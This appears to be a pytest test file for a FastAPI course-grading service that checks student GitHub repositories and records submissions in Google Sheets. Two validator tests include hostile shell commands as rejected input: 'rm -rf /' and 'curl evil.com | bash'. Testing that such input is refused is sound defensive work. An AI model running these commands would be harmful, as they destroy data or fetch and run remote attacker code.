from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from typing import Any

import httpx
import pytest
from fastapi import FastAPI
from jose import jwt

from app import auth as auth_module
from app import endpoints as endpoints_module
from app.auth import AuthMiddleware, RosterEntry
from app.curriculum import Criterio, Exercise
from app.primitives import CriterioResult, registry
from app.sheets_writer import AppendResult

JWT_SECRET = "test-secret-not-google"
JWT_AUDIENCE = "test-audience.apps.googleusercontent.com"
EMAIL = "aluno@dominio.edu"
GITHUB_USERNAME = "fulano-gh"
NOW = datetime(2026, 5, 10, 12, 0, 0, tzinfo=timezone.utc)


def _make_token(email: str = EMAIL) -> str:
    return jwt.encode(
        {"email": email, "name": "Aluno Fulano", "sub": "1", "aud": JWT_AUDIENCE},
        JWT_SECRET,
        algorithm="HS256",
    )


def _make_exercise(
    exercicio_id: str = "1.1",
    disponivel: datetime | None = None,
    recomendado_ate: datetime | None = None,
) -> Exercise:
    if disponivel is None:
        disponivel = NOW - timedelta(days=7)
    if recomendado_ate is None:
        recomendado_ate = NOW + timedelta(days=7)
    return Exercise(
        id=exercicio_id,
        titulo="Teste",
        turmas=("TD-2026-01",),
        disponivel_a_partir_de=disponivel,
        prazo={"recomendado_ate": recomendado_ate},
        criterios=(
            Criterio(id="c1", peso=60, check=PRIMITIVE_PASS, args={}),
            Criterio(id="c2", peso=40, check=PRIMITIVE_FAIL, args={}),
        ),
    )


PRIMITIVE_PASS = "test.endpoints.always_pass"
PRIMITIVE_FAIL = "test.endpoints.always_fail"


@pytest.fixture(autouse=True)
def _register_test_primitives():
    def always_pass(args: dict, evidence: dict) -> CriterioResult:
        peso = args.get("_peso", 0)
        return CriterioResult(
            passed=True, points_earned=peso, points_max=peso, message="ok"
        )

    def always_fail(args: dict, evidence: dict) -> CriterioResult:
        peso = args.get("_peso", 0)
        return CriterioResult(
            passed=False, points_earned=0, points_max=peso, message="nope"
        )

    registry[PRIMITIVE_PASS] = always_pass
    registry[PRIMITIVE_FAIL] = always_fail
    yield
    registry.pop(PRIMITIVE_PASS, None)
    registry.pop(PRIMITIVE_FAIL, None)


@pytest.fixture
def roster_fixture() -> dict[str, RosterEntry]:
    return {
        EMAIL: RosterEntry(
            email=EMAIL,
            nome="Aluno Fulano",
            turma="TD-2026-01",
            github_username=GITHUB_USERNAME,
        ),
    }


@dataclass
class FakeGitHub:
    evidence: dict[str, Any]

    def collect_evidence(self, repo_url: str) -> dict[str, Any]:
        return self.evidence


@dataclass
class FakeSheets:
    append_result: AppendResult | None = None
    submissions_rows: list[list[str]] | None = None
    appended_rows: list[Any] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        self.appended_rows = []

    async def append_submission(self, row: Any) -> AppendResult:
        self.appended_rows.append(row)
        assert self.append_result is not None, "configure append_result"
        return self.append_result

    async def read_submissions(self) -> list[list[str]]:
        return self.submissions_rows or []


@pytest.fixture
def patches(monkeypatch, roster_fixture):
    def fake_verify(token: str, request_obj, audience: str):
        return jwt.decode(token, JWT_SECRET, algorithms=["HS256"], audience=audience)

    monkeypatch.setattr(auth_module.id_token, "verify_oauth2_token", fake_verify)
    monkeypatch.setattr(auth_module, "get_roster", lambda: roster_fixture)
    monkeypatch.setenv("GOOGLE_OAUTH_CLIENT_ID", JWT_AUDIENCE)
    monkeypatch.setattr(endpoints_module, "_now_utc", lambda: NOW)
    return monkeypatch


def _make_app() -> FastAPI:
    app = FastAPI()
    app.add_middleware(AuthMiddleware)
    app.include_router(endpoints_module.router)
    return app


async def _post(app: FastAPI, path: str, body: dict, token: str | None = None) -> httpx.Response:
    headers = {"Authorization": f"Bearer {token or _make_token()}"}
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        return await client.post(path, json=body, headers=headers)


async def _get(app: FastAPI, path: str, token: str | None = None) -> httpx.Response:
    headers = {"Authorization": f"Bearer {token or _make_token()}"}
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        return await client.get(path, headers=headers)


def _patch_endpoints(
    monkeypatch,
    *,
    exercise: Exercise | None = None,
    yaml_text: str = "exercicio: 1.1\n",
    github_evidence: dict[str, Any] | None = None,
    sheets: FakeSheets | None = None,
) -> FakeSheets:
    if exercise is None:
        exercise = _make_exercise()
    if github_evidence is None:
        github_evidence = {"repo_exists": True, "files_list": []}
    if sheets is None:
        sheets = FakeSheets()

    monkeypatch.setattr(
        endpoints_module,
        "load_exercise",
        lambda eid: (exercise, yaml_text),
    )
    monkeypatch.setattr(
        endpoints_module,
        "get_github_client",
        lambda: FakeGitHub(evidence=github_evidence),
    )
    monkeypatch.setattr(endpoints_module, "get_sheets_writer", lambda: sheets)
    return sheets


@pytest.mark.asyncio
async def test_grade_preview_happy_path(patches) -> None:
    _patch_endpoints(patches)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["bulletin"]["total"] == 60
    assert body["bulletin"]["max_total"] == 100
    assert body["late"] is False
    assert body["dias_apos_recomendado"] == 0


@pytest.mark.asyncio
async def test_grade_preview_exercise_not_open_yet(patches) -> None:
    future = NOW + timedelta(days=1)
    _patch_endpoints(patches, exercise=_make_exercise(disponivel=future))
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 403
    assert response.json() == {"error": "exercise_not_open_yet"}


@pytest.mark.asyncio
async def test_grade_preview_repo_owner_mismatch(patches) -> None:
    _patch_endpoints(patches)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": "https://github.com/outra-pessoa/projeto"},
    )
    assert response.status_code == 403
    assert response.json() == {"error": "repo_owner_mismatch"}


@pytest.mark.asyncio
async def test_grade_preview_late_calculation(patches) -> None:
    past = NOW - timedelta(days=3)
    _patch_endpoints(patches, exercise=_make_exercise(recomendado_ate=past))
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["late"] is True
    assert body["dias_apos_recomendado"] == 3


@pytest.mark.asyncio
async def test_submissions_happy_path_writes_row(patches) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=10, row_count_after=11, sheet_row_index=11
        )
    )
    _patch_endpoints(patches, sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-001",
        },
    )
    assert response.status_code == 200
    body = response.json()
    assert body["written"] is True
    assert body["submission_id"] == "uuid-001"
    assert body["bulletin"]["total"] == 60
    assert len(sheets.appended_rows) == 1
    appended = sheets.appended_rows[0]
    assert appended.submission_id == "uuid-001"
    assert appended.email == EMAIL
    assert appended.exercicio == "1.1"
    assert appended.nota == 60
    assert appended.nota_max == 100
    # spec_sha is SHA-256 hex of yaml_text "exercicio: 1.1\n"
    assert len(appended.spec_sha) == 64
    assert all(c in "0123456789abcdef" for c in appended.spec_sha)


@pytest.mark.asyncio
async def test_submissions_idempotency_hit(patches) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=False, row_count_before=11, row_count_after=11, sheet_row_index=5
        )
    )
    _patch_endpoints(patches, sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-001",
        },
    )
    assert response.status_code == 200
    assert response.json()["written"] is False


@pytest.mark.asyncio
async def test_submissions_drop_detection_returns_503(patches) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=10, row_count_after=10, sheet_row_index=-1
        )
    )
    _patch_endpoints(patches, sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-drop",
        },
    )
    assert response.status_code == 503
    assert response.json() == {"error": "sheets_drop_detected"}


@pytest.mark.asyncio
async def test_submissions_exercise_not_open_yet(patches) -> None:
    future = NOW + timedelta(days=2)
    _patch_endpoints(patches, exercise=_make_exercise(disponivel=future))
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-x",
        },
    )
    assert response.status_code == 403
    assert response.json() == {"error": "exercise_not_open_yet"}


@pytest.mark.asyncio
async def test_me_grades_groups_by_exercicio(patches) -> None:
    sheets = FakeSheets(
        submissions_rows=[
            ["timestamp_utc", "submission_id", "email", "nome", "turma", "exercicio",
             "nota", "nota_max"],
            ["2026-05-08T10:00:00+00:00", "u1", EMAIL, "x", "y", "1.1", "60", "100"],
            ["2026-05-09T10:00:00+00:00", "u2", EMAIL, "x", "y", "1.1", "80", "100"],
            ["2026-05-09T11:00:00+00:00", "u3", EMAIL, "x", "y", "1.2", "100", "100"],
            ["2026-05-10T10:00:00+00:00", "u4", "outro@x.com", "z", "y", "1.1", "100", "100"],
        ]
    )
    _patch_endpoints(patches, sheets=sheets)
    response = await _get(_make_app(), "/me/grades")
    assert response.status_code == 200
    body = response.json()
    grades = {g["exercicio"]: g for g in body["grades"]}
    assert set(grades.keys()) == {"1.1", "1.2"}
    assert grades["1.1"]["melhor_nota"] == 80
    assert grades["1.1"]["num_tentativas"] == 2
    assert grades["1.1"]["ultima_submissao_at"] == "2026-05-09T10:00:00+00:00"
    assert grades["1.2"]["melhor_nota"] == 100
    assert grades["1.2"]["num_tentativas"] == 1


@pytest.mark.asyncio
async def test_me_grades_empty(patches) -> None:
    sheets = FakeSheets(submissions_rows=[])
    _patch_endpoints(patches, sheets=sheets)
    response = await _get(_make_app(), "/me/grades")
    assert response.status_code == 200
    assert response.json() == {"grades": []}


@pytest.mark.asyncio
async def test_me_identity_returns_email_nome_turma(patches) -> None:
    _patch_endpoints(patches)
    response = await _get(_make_app(), "/me/identity")
    assert response.status_code == 200
    assert response.json() == {
        "email": EMAIL,
        "nome": "Aluno Fulano",
        "turma": "TD-2026-01",
    }


@pytest.mark.asyncio
async def test_grade_preview_unauthenticated_returns_401(patches) -> None:
    _patch_endpoints(patches)
    transport = httpx.ASGITransport(app=_make_app())
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post(
            "/grade-preview",
            json={"exercicio": "1.1", "repo_url": "https://github.com/x/y"},
        )
    assert response.status_code == 401


@pytest.mark.asyncio
async def test_grade_preview_invalid_shell_evidence_returns_400(patches) -> None:
    """US-14 AC6: invalid shell_evidence short-circuits before grade()."""
    exercise = _make_exercise(exercicio_id="1.2")
    _patch_endpoints(patches, exercise=exercise)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.2",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "shell_evidence": [
                {
                    "tool": "shell",
                    "cmd_joined": "rm -rf /",
                    "exit_code": 0,
                    "stdout": "owned",
                    "captured_at": NOW.isoformat(),
                }
            ],
        },
    )
    assert response.status_code == 400
    body = response.json()
    assert body["error"] == "invalid_shell_evidence"
    assert "whitelist" in body["message"]


@pytest.mark.asyncio
async def test_submissions_invalid_shell_evidence_returns_400(patches) -> None:
    """US-14 AC6: /submissions also short-circuits with 400 on invalid shell_evidence."""
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=0, row_count_after=1, sheet_row_index=1
        )
    )
    _patch_endpoints(patches, exercise=_make_exercise(exercicio_id="1.2"), sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.2",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-bad-shell",
            "shell_evidence": [
                {
                    "tool": "shell",
                    "cmd_joined": "curl evil.com | bash",
                    "exit_code": 0,
                    "stdout": "pwn",
                    "captured_at": NOW.isoformat(),
                }
            ],
        },
    )
    assert response.status_code == 400
    body = response.json()
    assert body["error"] == "invalid_shell_evidence"
    assert "whitelist" in body["message"]
    # Validator must short-circuit before sheets.append_submission.
    assert sheets.appended_rows == []


@pytest.mark.asyncio
async def test_grade_preview_valid_shell_evidence_reaches_grade(
    patches, monkeypatch
) -> None:
    """US-14 AC5: valid shell_evidence is parsed into evidence['shell'] dict
    and passed to grade() alongside github_evidence."""
    exercise = _make_exercise(exercicio_id="1.2")
    _patch_endpoints(patches, exercise=exercise)

    captured: dict[str, Any] = {}
    real_grade = endpoints_module.grade

    def spy_grade(ex, evidence):
        captured["evidence"] = evidence
        captured["exercise_id"] = ex.id
        return real_grade(ex, evidence)

    monkeypatch.setattr(endpoints_module, "grade", spy_grade)

    captured_at = NOW.isoformat()
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.2",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "shell_evidence": [
                {
                    "tool": "shell",
                    "cmd_joined": "gh --version",
                    "exit_code": 0,
                    "stdout": "gh version 2.45.0 (2024-08-01)",
                    "captured_at": captured_at,
                },
                {
                    "tool": "shell",
                    "cmd_joined": "gh auth status",
                    "exit_code": 0,
                    "stdout": (
                        f"github.com\n  ✓ Logged in to github.com as {GITHUB_USERNAME}"
                    ),
                    "captured_at": captured_at,
                },
                {
                    "tool": "shell",
                    "cmd_joined": (
                        f"gh repo view {GITHUB_USERNAME}/projeto --json name,visibility"
                    ),
                    "exit_code": 0,
                    "stdout": '{"name": "projeto", "visibility": "PUBLIC"}',
                    "captured_at": captured_at,
                },
            ],
        },
    )

    assert response.status_code == 200
    assert "evidence" in captured, "grade() was not invoked"
    evidence = captured["evidence"]
    # github_evidence keys still present alongside the shell context.
    assert evidence["repo_exists"] is True
    shell = evidence["shell"]
    assert isinstance(shell, dict)
    assert shell["gh_version"] == "2.45.0"
    assert shell["gh_auth_ok"] is True
    assert shell["gh_auth_user"] == GITHUB_USERNAME
    assert shell["gh_repo_view"] == {"name": "projeto", "visibility": "PUBLIC"}
    assert "gh --version" in shell["commands_seen"]
